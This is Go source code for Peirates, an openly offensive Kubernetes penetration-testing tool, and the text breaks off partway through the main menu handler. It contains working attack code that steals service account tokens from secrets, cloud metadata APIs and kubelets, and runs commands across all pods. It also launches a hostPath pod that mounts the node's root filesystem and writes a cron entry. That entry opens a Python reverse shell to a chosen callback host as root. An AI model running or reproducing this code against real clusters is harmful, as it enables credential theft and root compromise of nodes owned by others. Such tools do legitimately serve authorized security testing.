package peirates

// Peirates - an Attack tool for Kubernetes clusters
//
// You need to use "package main" for executables
//
// BTW always run `go fmt` before you check in code. go fmt is law.
//

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"encoding/json" // Command line flag parsing
	"fmt"           // String formatting (Printf, Sprintf)
	"io/ioutil"     // Utils for dealing with IO streams

	// Logging utils
	"math/rand" // Module for creating random string building
	"os"        // Environment variables ...
	"strconv"   // String parsing
	"strings"
	"syscall"

	// HTTP client/server
	"net/http" // HTTP requests
	"net/url"  // URL encoding
	"os/exec"  // for exec
	"regexp"
	"time" // Time modules

	"github.com/aws/aws-sdk-go/aws"
	"github.com/aws/aws-sdk-go/service/s3"
	// kubernetes client
)

var UseAuthCanI bool = true

// getPodList returns an array of running pod names, parsed from "kubectl -n namespace get pods"
func getPodList(connectionString ServerInfo) []string {

	if !kubectlAuthCanI(connectionString, "get", "pods") {
		println("[-] Permission Denied: your service account isn't allowed to get pods")
		return []string{}
	}

	responseJSON, _, err := runKubectlSimple(connectionString, "get", "pods", "-o", "json")
	if err != nil {
		fmt.Printf("[-] Error while getting pods: %s\n", err.Error())
		return []string{}
	}

	type PodsResponse struct {
		Items []struct {
			Metadata struct {
				Name string `json:"name"`
			} `json:"metadata"`
		} `json:"items"`
	}

	var response PodsResponse
	json.Unmarshal(responseJSON, &response)

	if err != nil {
		fmt.Printf("[-] Error while getting pods: %s\n", err.Error())
		return []string{}
	}

	pods := make([]string, len(response.Items))

	for i, pod := range response.Items {
		pods[i] = pod.Metadata.Name
	}

	return pods
}

// Get the names of the available Secrets from the current namespace and a list of service account tokens
func getSecretList(connectionString ServerInfo) ([]string, []string) {

	if !kubectlAuthCanI(connectionString, "get", "secrets") {
		println("[-] Permission Denied: your service account isn't allowed to list secrets")
		return []string{}, []string{}
	}

	type SecretsResponse struct {
		Items []struct {
			Metadata struct {
				Name string `json:"name"`
			} `json:"metadata"`
			Type string `json:"type"`
		} `json:"items"`
	}

	secretsJSON, _, err := runKubectlSimple(connectionString, "get", "secrets", "-o", "json")
	if err != nil {
		fmt.Printf("[-] Error while getting secrets: %s\n", err.Error())
		return []string{}, []string{}
	}

	var response SecretsResponse
	err = json.Unmarshal(secretsJSON, &response)
	if err != nil {
		fmt.Printf("[-] Error while getting secrets: %s\n", err.Error())
		return []string{}, []string{}
	}

	secrets := make([]string, len(response.Items))
	var serviceAccountTokens []string

	for i, secret := range response.Items {
		secrets[i] = secret.Metadata.Name
		if secret.Type == "kubernetes.io/service-account-token" {
			serviceAccountTokens = append(serviceAccountTokens, secret.Metadata.Name)
		}
	}

	return secrets, serviceAccountTokens
}

// GetGCPBearerTokenFromMetadataAPI takes the name of a GCP service account and returns a token
func GetGCPBearerTokenFromMetadataAPI(account string) string {
	var headers []HeaderLine
	headers = []HeaderLine{
		HeaderLine{"Metadata-Flavor", "Google"},
	}
	urlSvcAccount := "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/" + account + "/token"

	reqTokenRaw := GetRequest(urlSvcAccount, headers, false)
	if (reqTokenRaw == "") || (strings.HasPrefix(reqTokenRaw, "ERROR:")) {
		println("[-] Error - could not perform request ", urlSvcAccount)
		return ("ERROR")
	}
	// Body will look like this, unless error has occurred: {"access_token":"xxxxxxx","expires_in":2511,"token_type":"Bearer"}
	// TODO: Add a check for a 200 status code
	// Split the body on "" 's for now
	// TODO: Parse this as JSON
	tokenElements := strings.Split(string(reqTokenRaw), "\"")
	if tokenElements[1] == "access_token" {
		return (tokenElements[3])
	} else {
		println("[-] Error - could not find token in returned body text: ", string(reqTokenRaw))
		return "ERROR"
	}
}

// SwitchNamespace switches the current ServerInfo.Namespace to one entered by the user.
func SwitchNamespace(connectionString *ServerInfo) bool {
	println("\nEnter namespace to switch to or hit enter to maintain current namespace: ")
	input, _ := readLine()
	if input != "" {
		connectionString.Namespace = input
	}
	return true
}

// readLine reads up through the next \n from stdin. The returned string does
// not include the \n.
func readLine() (string, error) {
	reader := bufio.NewReader(os.Stdin)
	line, err := reader.ReadString('\n')
	if err != nil {
		return "", err
	}
	return line[:len(line)-1], err
}

// canCreatePods() runs kubectl to check if current token can create a pod
// inAPod() attempts to determine if we are running in a pod.
// Long-term, this will likely go away
func inAPod(connectionString ServerInfo) bool {

	if os.Getenv("KUBERNETES_SERVICE_HOST") != "" {
		println("[+] You may be in a Kubernetes pod. API Server to be found at: ", os.Getenv("KUBERNETES_SERVICE_HOST"))
		return true
	} else {
		println("[-] You may not be in a Kubernetes pod. Press ENTER to continue.")
		var input string
		fmt.Scanln(&input)
		return false
	}
}

// PrintNamespaces prints the output of kubectl get namespaces, but also returns the list of active namespaces
func PrintNamespaces(connectionString ServerInfo) []string {

	if !kubectlAuthCanI(connectionString, "get", "namespaces") {
		println("[-] Permission Denied: your service account isn't allowed to get namespaces")
		return []string{}
	}

	var namespaces []string

	NamespacesRaw, _, err := runKubectlSimple(connectionString, "get", "namespaces")

	if err != nil {
		fmt.Printf("[-] Error while getting namespaces: %s\n", err.Error())
		return []string{}
	}
	// Iterate over kubectl get namespaces, stripping off the first line which matches NAME and then grabbing the first column

	lines := strings.Split(string(NamespacesRaw), "\n")

	for _, line := range lines {
		println(line)
		matched, err := regexp.MatchString(`^\s*$`, line)
		if err != nil {
			fmt.Printf("[-] Error while parsing namespaces: %s\n", err.Error())
			return []string{}
		}
		if !matched {
			// Get rid of blank lines
			if strings.Fields(line)[1] == "Active" {
				namespace := strings.Fields(line)[0]
				if namespace != "NAME" {
					namespaces = append(namespaces, namespace)
				}
			}
		}
	}

	return namespaces
}

func printListOfPods(connectionString ServerInfo) {
	runningPods := getPodList(connectionString)
	for _, listpod := range runningPods {
		println("[+] Pod Name: " + listpod)
	}

}

// execInAllPods() runs kubeData.command in all running pods
func execInAllPods(connectionString ServerInfo, command string) {
	runningPods := getPodList(connectionString)
	execInListPods(connectionString, runningPods, command)
}

// execInListPods() runs kubeData.command in all pods in the provided list
func execInListPods(connectionString ServerInfo, pods []string, command string) {
	if !kubectlAuthCanI(connectionString, "exec", "pods") {
		println("[-] Permission Denied: your service account isn't allowed to exec commands in pods")
		return
	}

	println("[+] Running supplied command in list of pods")
	for _, execPod := range pods {
		execInPodOut, _, err := runKubectlSimple(connectionString, "exec", "-it", execPod, "--", "/bin/sh", "-c", command)
		if err != nil {
			fmt.Printf("[-] Executing %s in Pod %s failed: %s\n", command, execPod, err)
		} else {
			println(" ")
			println(string(execInPodOut))
		}
	}
}

func injectIntoAPodViaAPIServer(connectionString ServerInfo, pod string) {
	if !kubectlAuthCanI(connectionString, "exec", "pods") {
		println("[-] Permission Denied: your service account isn't allowed to exec into pods")
		return
	}

	println("[+] Transferring a copy of Peirates into pod:", pod)

	// First, try copying the binary in via a kubectl cp command.
	filename := os.Getenv("_")
	destination := pod + ":/tmp"

	copyIntoPod, _, err := runKubectlSimple(connectionString, "cp", filename, destination)
	if err != nil {
		fmt.Printf("[-] Copying peirates into pod %s failed.\n", pod)
	} else {
		println(string(copyIntoPod))
		println("[+] Transfer successful")

		// println("Do you wish to [1] move entirely into that pod OR [2] be given a copy-pastable command so you can keep this peirates instance?")
		// Feature request: give the user the option to exec into the next pod.
		// $_
		// runKubectlSimple (exec -it pod /tmp/peirates)

		// println("Option 2 is: ")
		// CA path
		caPath := "--certificate-authority=" + connectionString.CAPath
		args := []string{"kubectl", "--token", connectionString.Token, caPath, "-n", connectionString.Namespace, "exec", "-it", pod, "--", "/tmp/peirates"}

		path, lookErr := exec.LookPath("kubectl")
		if lookErr != nil {
			println("kubectl not found in the PATH in this pod. You can correct this and try again. Alternatively:\n")
			println("Start up a new process, put a copy of kubectl in it, and move into that pod by running the following command:\n\n")
			println("kubectl --token " + connectionString.Token + " --certificate-authority=" + connectionString.CAPath + " -n " + connectionString.Namespace + " exec -it " + pod + " -- /tmp/peirates\n")
		} else {
			env := os.Environ()
			execErr := syscall.Exec(path, args, env)
			if execErr != nil {
				println("[-] Exec failed - try manually, as below.\n")
				println("Start up a new process, put a copy of kubectl in it, and move into that pod by running the following command:\n\n")
				println("kubectl --token " + connectionString.Token + " --certificate-authority=" + connectionString.CAPath + " -n " + connectionString.Namespace + " exec -it " + pod + " -- /tmp/peirates\n")
			}
		}
	}
}

//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
// Added mountFS code to create yaml file drop to disk and create a pod.    |
//--------------------------------------------------------------------------|

// randSeq generates a LENGTH length string of random lowercase letters.
func randSeq(length int) string {
	letters := []rune("abcdefghijklmnopqrstuvwxyz")
	b := make([]rune, length)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

type AWSS3BucketObject struct {
	Data string `json:"Data"`
}

// GetPodsInfo gets details for all pods in json output and stores in PodDetails struct
func GetPodsInfo(connectionString ServerInfo, podDetails *PodDetails) {

	if !kubectlAuthCanI(connectionString, "get", "pods") {
		println("[-] Permission Denied: your service account isn't allowed to get pods")
		return
	}

	println("[+] Getting details for all pods")
	podDetailOut, _, err := runKubectlSimple(connectionString, "get", "pods", "-o", "json")
	println(string(podDetailOut))
	if err != nil {
		println("[-] Unable to retrieve details from this pod: ", err)
	} else {
		println("[+] Retrieving details for all pods was successful: ")
		err := json.Unmarshal(podDetailOut, &podDetails)
		if err != nil {
			println("[-] Error unmarshaling data: ", err)
		}
	}
}

// PrintHostMountPoints prints all pods' host volume mounts parsed from the Spec.Volumes pod spec by GetPodsInfo()
func PrintHostMountPoints(podInfo PodDetails) {
	println("[+] Getting all host mount points for pods in current namespace")
	for _, item := range podInfo.Items {
		// println("+ Host Mount Points for Pod: " + item.Metadata.Name)
		for _, volume := range item.Spec.Volumes {
			if volume.HostPath.Path != "" {
				println("\tHost Mount Point: " + string(volume.HostPath.Path) + " found for pod " + item.Metadata.Name)
			}
		}
	}
}

// PrintHostMountPointsForPod prints a single pod's host volume mounts parsed from the Spec.Volumes pod spec by GetPodsInfo()
func PrintHostMountPointsForPod(podInfo PodDetails, pod string) {
	println("[+] Getting all Host Mount Points only for pod: " + pod)
	for _, item := range podInfo.Items {
		if item.Metadata.Name == pod {
			for _, volume := range item.Spec.Volumes {
				if volume.HostPath.Path != "" {
					println("\tHost Mount Point: " + string(volume.HostPath.Path))
				}
			}
		}
	}
}

// GetRoles enumerates all roles in use on the cluster (in the default namespace).
// It parses all roles into a KubeRoles object.
func GetRoles(connectionString ServerInfo, kubeRoles *KubeRoles) {
	println("[+] Getting all Roles")
	rolesOut, _, err := runKubectlSimple(connectionString, "get", "role", "-o", "json")
	if err != nil {
		println("[-] Unable to retrieve roles from this pod: ", err)
	} else {
		println("[+] Retrieving roles was successful: ")
		err := json.Unmarshal(rolesOut, &kubeRoles)
		if err != nil {
			println("[-] Error unmarshaling data: ", err)
		}

	}
}

// MountRootFS creates a pod that mounts its node's root filesystem.
func MountRootFS(allPodsListme []string, connectionString ServerInfo, callbackIP, callbackPort string) {
	var MountInfoVars = MountInfo{}

	// First, confirm we're allowed to create pods
	if !kubectlAuthCanI(connectionString, "create", "pod") {
		println("[-] AUTHORIZATION: this token isn't allowed to create pods in this namespace")
		return
	}
	// TODO: changing parsing to occur via JSON
	// TODO: check that image exists / handle failure by trying again with the next youngest pod's image or a named pod's image

	// Approach 1: Try to get the image file for my own pod
	//./kubectl describe pod `hostname`| grep Image:
	hostname := os.Getenv("HOSTNAME")
	approach1Success := false
	var image string
	podDescriptionRaw, _, err := runKubectlSimple(connectionString, "describe", "pod", hostname)
	if err != nil {
		approach1Success = false
		println("[-] DEBUG: describe pod didn't work")
	} else {
		podDescriptionLines := strings.Split(string(podDescriptionRaw), "\n")
		for _, line := range podDescriptionLines {
			start := strings.Index(line, "Image:")
			if start != -1 {
				// Found an Image line -- now get the image
				image = strings.TrimSpace(line[start+6:])
				println("[+] Using your current pod's image:", image)
				approach1Success = true

				MountInfoVars.image = image
			}
		}
		if !approach1Success {
			println("[-] DEBUG: did not find an image line in your pod's definition.")
		}
	}

	if !approach1Success {
		// Approach 2 - use the most recently staged running pod
		//
		// TODO: re-order the list and stop the for loop as soon as we have the first running or as soon as we're able to make one of these work.

		// Future version of approach 2:
		// 	Let's make something to mount the root filesystem, but not pick the most recent one.  Rather,
		// it should populate a list of all pods in the current namespace, then iterate through
		// images trying to find one that has a shell.

		// Here's the useful part of that data.

		// type PodDetails struct {
		// 	Items      []struct {
		// 		Metadata   struct {
		// 			Name            string `json:"name"`
		// 			Namespace       string `json:"namespace"`
		// 		} `json:"metadata"`
		// 		Spec struct {
		// 			Containers []struct {
		// 				Image           string `json:"image"

		println("Getting image from the most recently-staged pod in thie namespace")
		getImagesRaw, _, err := runKubectlSimple(connectionString, "get", "pods", "-o", "wide", "--sort-by", "metadata.creationTimestamp")
		if err != nil {
			// If this fails, just go back to the menu.
			println("[-] ERROR: Could not get pods")
			return
		}
		getImageLines := strings.Split(string(getImagesRaw), "\n")
		for _, line := range getImageLines {
			matched, err := regexp.MatchString(`^\s*$`, line)
			if err != nil {
				println("[-] ERROR: could not parse pod list")
				return
			}
			if !matched {
				//added checking to only enumerate running pods
				// TODO: check for potential bug: did we enumerate only running pods as intended?
				MountInfoVars.image = strings.Fields(line)[7]
			}
		}
	}

	//create random string
	rand.Seed(time.Now().UnixNano())
	randomString := randSeq(6)

	// Create pod manifest in YAML
	MountInfoVars.yamlBuild = fmt.Sprintf(`apiVersion: v1
kind: Pod
metadata:
  annotations:
  labels:
  name: attack-pod-%s
  namespace: %s
spec:
  containers:
  - image: %s
    imagePullPolicy: IfNotPresent
    name: attack-container
    command: ["/bin/sh","-c","sleep infinity"]
    volumeMounts:
    - mountPath: /root
      name: mount-fsroot-into-slashroot
  restartPolicy: Never
  volumes:
  - name: mount-fsroot-into-slashroot
    hostPath:
       path: /
`, randomString, connectionString.Namespace, MountInfoVars.image)

	// Write yaml file out to current directory
	ioutil.WriteFile("attack-pod.yaml", []byte(MountInfoVars.yamlBuild), 0700)

	_, _, err = runKubectlSimple(connectionString, "apply", "-f", "attack-pod.yaml")
	if err != nil {
		println("[-] Pod did not stage successfully.")
		return
	} else {
		attackPodName := "attack-pod-" + randomString
		println("[+] Executing code in " + attackPodName + " - please wait for Pod to stage")
		time.Sleep(5 * time.Second)
		stdin := strings.NewReader("*  *    * * *   root    python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + callbackIP + "\"," + callbackPort + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\", \"-i\"]);'\n")
		stdout := bytes.Buffer{}
		stderr := bytes.Buffer{}
		err := runKubectlWithConfig(connectionString, stdin, &stdout, &stderr, "exec", "-it", attackPodName, "--", "/bin/sh", "-c", "cat >> /root/etc/crontab")

		if err != nil {
			// BUG: when we remove that timer above and thus get an error condition, program crashes during the runKubectlSimple instead of reaching this message
			println("[-] Exec into that pod failed. If your privileges do permit this, the pod may have needed more time.  Use this main menu option to try again: Run command in one or all pods in this namespace.")
			return
		} else {
			println("[+] Netcat callback added sucessfully.")
			println("[+] Removing attack pod.")
			err := runKubectlWithConfig(connectionString, stdin, &stdout, &stderr, "delete", "pod", attackPodName)
			if err != nil {
				println("May not have been able to delete attack pod.", err)
			}

		}
	}
}

func clearScreen() {
	fmt.Print("Press Enter to Proceed .....")
	var input string
	fmt.Scanln(&input)
	c := exec.Command("clear")
	c.Stdout = os.Stdout
	c.Run()
}

// SERVICE ACCOUNT MANAGEMENT functions start here

// ServiceAccount stores service account information.
type ServiceAccount struct {
	Name            string    // Service account name
	Token           string    // Service account token
	DiscoveryTime   time.Time // Time the service account was discovered
	DiscoveryMethod string    // How the service account was discovered (file on disk, secrets, user input, etc.)
}

// makeNewServiceAccount creates a new service account with the provided name,
// token, and discovery method, while setting the DiscoveryTime to time.Now()
func makeNewServiceAccount(name, token, discoveryMethod string) ServiceAccount {
	return ServiceAccount{
		Name:            name,
		Token:           token,
		DiscoveryTime:   time.Now(),
		DiscoveryMethod: discoveryMethod,
	}
}

func acceptServiceAccountFromUser() ServiceAccount {
	println("\nPlease paste in a new service account token or hit ENTER to maintain current token.")
	serviceAccount := ServiceAccount{
		Name:            "",
		Token:           "",
		DiscoveryTime:   time.Now(),
		DiscoveryMethod: "User Input",
	}
	println("\nWhat do you want to name this service account?")
	serviceAccount.Name, _ = readLine()
	println("\nPaste the service account token and hit ENTER:")
	serviceAccount.Token, _ = readLine()

	return serviceAccount
}

func assignServiceAccountToConnection(account ServiceAccount, info *ServerInfo) {
	info.TokenName = account.Name
	info.Token = account.Token
}

func banner(connectionString ServerInfo, awsCredentials AWSCredentials, assumedAWSRole AWSCredentials) {

	name, err := os.Hostname()
	if err != nil {
		panic(err)
	}

	println(`________________________________________
|  ___  ____ _ ____ ____ ___ ____ ____ |
|  |__] |___ | |__/ |__|  |  |___ [__  |
|  |    |___ | |  \ |  |  |  |___ ___] |
|______________________________________|
,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
,,,,,,,,,,,,,.............:,,,,,,,,,,,,,
,,,,,,,,,,...,IIIIIIIIIII+...,,,,,,,,,,,
,,,,,,,:..~IIIIIIIIIIIIIIIIII...,,,,,,,,
,,,,,,..?IIIIIII.......IIIIIIII..,,,,,,,
,,,,,..IIIIIIII...II?...?IIIIIII,..,,,,,
,,,:..IIIIIIII..:IIIIII..?IIIIIIII..,,,,
,,,..IIIIIIIII..IIIIIII...IIIIIIII7.:,,,
,,..IIIIIIIII.............IIIIIIIII..,,,
,,.=IIIIIIII...~~~~~~~~~...IIIIIIIII..,,
,..IIIIIIII...+++++++++++,..+IIIIIII..,,
,..IIIIIII...+++++++++++++:..~IIIIII..,,
,..IIIIII...++++++:++++++++=..,IIIII..,,
,..IIIII...+....,++.++++:+.++...IIII..,,
,,.+IIII...+..,+++++....+,.+...IIIII..,,
,,..IIIII...+++++++++++++++...IIIII..:,,
,,,..IIIII...+++++++++++++...IIIII7..,,,
,,,,.,IIIII...+++++++++++...?IIIII..,,,,
,,,,:..IIIII...............IIIII?..,,,,,
,,,,,,..IIIII.............IIIII..,,,,,,,
,,,,,,,,..7IIIIIIIIIIIIIIIII?...,,,,,,,,
,,,,,,,,,:...?IIIIIIIIIIII....,,,,,,,,,,
,,,,,,,,,,,,:.............,,,,,,,,,,,,,,
,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
________________________________________
	Peirates v1.0.31 by InGuardians
  https://www.inguardians.com/peirates
----------------------------------------------------------------`)

	if connectionString.Token != "" {

		fmt.Printf("[+] Service Account Loaded: %s\n", connectionString.TokenName)
	}
	var haveCa bool = false
	if connectionString.CAPath != "" {
		haveCa = true
	}
	fmt.Printf("[+] Certificate Authority Certificate: %t\n", haveCa)
	fmt.Printf("[+] Kubernetes API Server: %s:%s\n", connectionString.RIPAddress, connectionString.RPort)
	println("[+] Current hostname/pod name:", name)
	println("[+] Current namespace:", connectionString.Namespace)
	if len(assumedAWSRole.AccessKeyId) > 0 {
		println("[+] AWS IAM Credentials (assumed): " + assumedAWSRole.AccessKeyId + " (" + assumedAWSRole.accountName + ")\n")
	}
	if len(awsCredentials.AccessKeyId) > 0 {
		if len(awsCredentials.accountName) > 0 {
			println("[+] AWS IAM Credentials (available): " + awsCredentials.AccessKeyId + " (" + awsCredentials.accountName + ")\n")
		} else {
			println("[+] AWS IAM Credentials (available): " + awsCredentials.AccessKeyId + "\n")
		}
	}

}

// GetNodesInfo runs kubectl get nodes -o json.
func GetNodesInfo(connectionString ServerInfo) {
	println("[+] Getting details for all pods")
	podDetailOut, _, err := runKubectlSimple(connectionString, "get", "nodes", "-o", "json")
	println(string(podDetailOut))
	if err != nil {
		println("[-] Unable to retrieve node details: ", err)
	}
}

// ExecuteCodeOnKubelet runs a command on every pod on every node via their Kubelets.
func ExecuteCodeOnKubelet(connectionString ServerInfo, ServiceAccounts *[]ServiceAccount) {
	println("[+] Getting IP addresses for the nodes in the cluster...")
	// BUG : This auth check isn't catching when we're not allowed to get nodes at the cluster scope
	if !kubectlAuthCanI(connectionString, "get", "nodes") {
		println("[-] Permission Denied: your service account isn't allowed to get nodes")
		return
	}

	nodeDetailOut, _, err := runKubectlSimple(connectionString, "get", "nodes", "-o", "json")
	println(nodeDetailOut)

	if err != nil {
		println("[-] Unable to retrieve node details: ")
	} else {
		var getnodeDetail GetNodeDetails
		err := json.Unmarshal(nodeDetailOut, &getnodeDetail)
		if err != nil {
			println("[-] Error unmarshaling data in this secret: ", err)
		}

	nodeLoop:
		for _, item := range getnodeDetail.Items {

			for _, addr := range item.Status.Addresses {
				// println("[+] Found IP for node " + item.Metadata.Name + " - " + addr.Address)
				if addr.Type == "Hostname" {
				} else {
					println("[+] Kubelet Pod Listing URL: " + item.Metadata.Name + " - http://" + addr.Address + ":10255/pods")
					println("[+] Grabbing Pods from node: " + item.Metadata.Name)

					// Make a request for our service account(s)
					var headers []HeaderLine

					urlSvcAccount := "http://" + addr.Address + ":10255/pods"
					runningPodsBody := GetRequest(urlSvcAccount, headers, false)
					if (runningPodsBody == "") || (strings.HasPrefix(runningPodsBody, "ERROR:")) {
						println("[-] Kubelet request for running pods failed - using this URL:", urlSvcAccount)
						continue nodeLoop
					}

					var output []PodNamespaceContainerTuple
					var podDetails PodDetails
					json.Unmarshal([]byte(runningPodsBody), &podDetails)
					for _, item := range podDetails.Items {
						podName := item.Metadata.Name
						podNamespace := item.Metadata.Namespace
						for _, container := range item.Status.ContainerStatuses {
							running := container.State.Running != nil
							containerName := container.Name
							if running && containerName != "pause" {
								output = append(output, PodNamespaceContainerTuple{
									PodName:       podName,
									PodNamespace:  podNamespace,
									ContainerName: containerName,
								})
								// Let's set up to do the exec via the Kubelet
								tr := &http.Transport{
									TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
								}
								sslClient := &http.Client{Transport: tr}

								// curl -sk https://10.23.58.41:10250/run/" + podNamespace + "/" + podName + "/" + containerName + "/ -d \"cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token\""

								data := url.Values{}
								data.Set("cmd", "cat "+ServiceAccountPath+"token")

								urlExecPod := "https://" + addr.Address + ":10250/run/" + podNamespace + "/" + podName + "/" + containerName + "/"

								// reqExecPod, err := http.PostForm(urlExecPod, formData)
								println("===============================================================================================")
								println("Asking Kubelet to dump service account token via URL:", urlExecPod)
								println("")
								reqExecPod, err := http.NewRequest("POST", urlExecPod, strings.NewReader(data.Encode()))
								reqExecPod.Header.Add("Content-Type", "application/x-www-form-urlencoded")
								reqExecPod.Header.Add("Content-Length", strconv.Itoa(len(data.Encode())))
								respExecPod, err := sslClient.Do(reqExecPod)
								if err != nil {
									fmt.Printf("[-] Error - could not perform request --%s-- - %s\n", urlExecPod, err.Error())
									respExecPod.Body.Close()
									continue
								}
								if respExecPod.Status != "200 OK" {
									fmt.Printf("[-] Error - response code: %s\n", respExecPod.Status)
									continue
								}
								defer respExecPod.Body.Close()
								bodyExecCommand, err := ioutil.ReadAll(respExecPod.Body)
								token := string(bodyExecCommand)
								println("[+] Got service account token for", "ns:"+podNamespace+" pod:"+podName+" container:"+containerName+":", token)
								println("")
								name := "Pod ns:" + podNamespace + ":" + podName
								serviceAccount := makeNewServiceAccount(name, token, "kubelet")
								*ServiceAccounts = append(*ServiceAccounts, serviceAccount)
							}
						}
					}
				}
			}
		}
	}
}

type PodNamespaceContainerTuple struct {
	PodName       string
	PodNamespace  string
	ContainerName string
}

//------------------------------------------------------------------------------------------------------------------------------------------------

// Main starts Peirates
func Main() {

	// Create a global variable named "connectionString" initialized to default values
	connectionString := ParseLocalServerInfo()
	cmdOpts := CommandLineOptions{connectionConfig: &connectionString}
	//var kubeRoles KubeRoles
	var podInfo PodDetails

	// Store all acquired namespaces for this cluster in a global variable, populated and refreshed by PrintNamespaces()
	var Namespaces []string
	println(Namespaces)

	//kubeData.arg =""
	//kubeData.list = {}

	// Run the option parser to initialize connectionStrings
	parseOptions(&cmdOpts)

	// List of current service accounts
	serviceAccounts := []ServiceAccount{makeNewServiceAccount(connectionString.TokenName, connectionString.Token, "Loaded at startup")}

	// Check environment variables - see KUBERNETES_SERVICE_HOST and KUBERNETES_SERVICE_PORT
	// Watch the documentation on these variables for changes:
	// https://kubernetes.io/docs/concepts/containers/container-environment-variables/

	// Read AWS credentials from environment variables if present.
	awsCredentials := PullIamCredentialsFromEnvironmentVariables()
	// Make room for an assumed role.
	var assumedAWSrole AWSCredentials

	var input int
	for ok := true; ok; ok = (input != 2) {
		banner(connectionString, awsCredentials, assumedAWSrole)
		println(`----------------------------------------------------------------
Namespaces, Service Accounts and Roles |
---------------------------------------+
[1] List, maintain, or switch service account contexts [sa-menu]
[2] List and/or change namespaces [ns-menu]
[3] Get list of pods in current namespace [list-pods]
[4] Get complete info on all pods (json) [dump-pod-info]
[5] Check all pods for volume mounts [find-volume-mounts]
[6] Enter AWS IAM credentials manually [enter-aws-credentials]
[7] Attempt to Assume a Different AWS Role [aws-assume-role]
[8] Deactivate assumed AWS role [aws-empty-assumed-role]
-------------------------+
Steal Service Accounts   |
-------------------------+
[10] List secrets in this namespace from API server [list-secrets]
[11] Get a service account token from a secret [secret-to-sa]
[12] Request IAM credentials from AWS Metadata API [get-aws-token]
[13] Request IAM credentials from GCP Metadata API [get-gcp-token]
[14] Request kube-env from GCP Metadata API [attack-kube-env-gcp]
[15] Pull Kubernetes service account tokens from kops' GCS bucket (Google Cloud only) [attack-kops-gcs-1] 
[16] Pull Kubernetes service account tokens from kops' S3 bucket (AWS only) [attack-kops-aws-1] 
--------------------------------+
Interrogate/Abuse Cloud API's   |
--------------------------------+
[17] List AWS S3 Buckets accessible (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls]
[18] List contents of an AWS S3 Bucket (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls-objects]
-----------+
Compromise |
-----------+
[20] Gain a reverse rootshell on a node by launching a hostPath-mounting pod [attack-pod-hostpath-mount]
[21] Run command in one or all pods in this namespace via the API Server [exec-via-api]
[22] Run a token-dumping command in all pods via Kubelets (authorization permitting) [exec-via-kubelet]
-----------------+
Off-Menu         +
-----------------+
[90] Run a kubectl command in the current namespace and service account context [kubectl]
[91] Make an HTTP request (GET or POST) to a user-specified URL [curl]
[92] Deactivate "auth can-i" checking before attempting actions [set-auth-can-i] 

[exit] Exit Peirates 
----------------------------------------------------------------`)
		fmt.Printf("Peirates:># ")

		// Banner items to implement

		// Run a command on a pod from the Kubelet
		//
		// Get a list of roles for this service account [not yet implemented]
		// Get a list of roles available on the cluster [implemented but not connected to menu]
		// Get a list of abilities for a role [not yet implemented]
		// Request list of pods from a Kubelet [not yet implemented]
		// Pull Kubernetes service account tokens from S3 [AWS only] [not yet implemented]
		// Shell out to bash (not yet implemented)
		// Build YAML Files (not yet implemented)

		var input string
		var userResponse string
		fmt.Scanln(&input)
		// Peirates MAIN MENU
		switch input {

		// exit
		case "exit", "quit":
			os.Exit(0)

		//	[0] Run a kubectl command in the current namespace, API server and service account context
		case "0", "90", "kubectl":
			println(`
This function allows you to run a kubectl command, with only a few restrictions.

Your command must not:

- change namespace
- specify a different service account 
- change nameservers
- run for longer than a few seconds (as in kubectl exec)

Your command will crash this program if it is not permitted.

These requirements are dynamic - watch new versions for changes.

Leave off the "kubectl" part of the command.  For example:

- get pods
- get pod podname -o yaml
- get secret secretname -o yaml

`)

			fmt.Printf("Please enter a kubectl command: ")
			input, _ = readLine()

			arguments := strings.Fields(input)

			// for _, arg := range arguments {
			// 	println("Argument:", arg)
			//}
			// TODO: Create an authorization check
			// if !kubectlAuthCanI(connectionString, "get", "secret") {
			//	println("[-] Permission Denied: your service account isn't allowed to get secrets")
			//	break
			//}

			// func runKubectlSimple(cfg ServerInfo, cmdArgs ...string) ([]byte, []byte, error) {
			kubectlOutput, _, err := runKubectlSimple(connectionString, arguments...)
			if err != nil {
				println("[-] Could not perform action: kubectl ", input)
				break
			}
			kubectlOutputLines := strings.Split(string(kubectlOutput), "\n")
			for _, line := range kubectlOutputLines {
				println(line)
			}
			break
		// [1] Enter a different service account token
		case "1", "sa-menu", "service-account-menu", "sa", "service-account":
			println("Current primary service account: %s", connectionString.TokenName)
			println("\n")
			println("[1] List service accounts [list]")
			println("[2] Switch primary service account [switch]")
			println("[3] Enter new service account JWT [add]")
			println("[4] Export service accounts to JSON [export]")
			println("[5] Import service accounts from JSON [import]")
			println("\n")

			fmt.Scanln(&input)
			switch strings.ToLower(input) {
			case "1", "list":
				println("\nAvailable Service Accounts:")
				for i, account := range serviceAccounts {
					if account.Name == connectionString.TokenName {
						fmt.Printf("> [%d] %s\n", i, account.Name)
					} else {
						fmt.Printf("  [%d] %s\n", i, account.Name)
					}
				}
			case "2", "switch":
				println("\nAvailable Service Accounts:")
				for i, account := range serviceAccounts {
					if account.Name == connectionString.TokenName {
						fmt.Printf("> [%d] %s\n", i, account.Name)
					} else {
						fmt.Printf("  [%d] %s\n", i, account.Name)
					}
				}
				println("\nEnter service account number or 0 to abort: ")
				var tokNum int
				fmt.Scanln(&input)
				_, err := fmt.Sscan(input, &tokNum)
				if err != nil {
					fmt.Printf("Error parsing service account selection: %s\n", err.Error())
				} else if tokNum < 0 || tokNum >= len(serviceAccounts) {
					fmt.Printf("Service account %d does not exist!\n", tokNum)
				} else if tokNum == 0 {
					println("Aborting service account switch...")
				} else {
					assignServiceAccountToConnection(serviceAccounts[tokNum], &connectionString)
					fmt.Printf("Selected %s // %s\n", connectionString.TokenName, connectionString.Token)
				}
			case "3", "add":
				serviceAccount := acceptServiceAccountFromUser()
				serviceAccounts = append(serviceAccounts, serviceAccount)

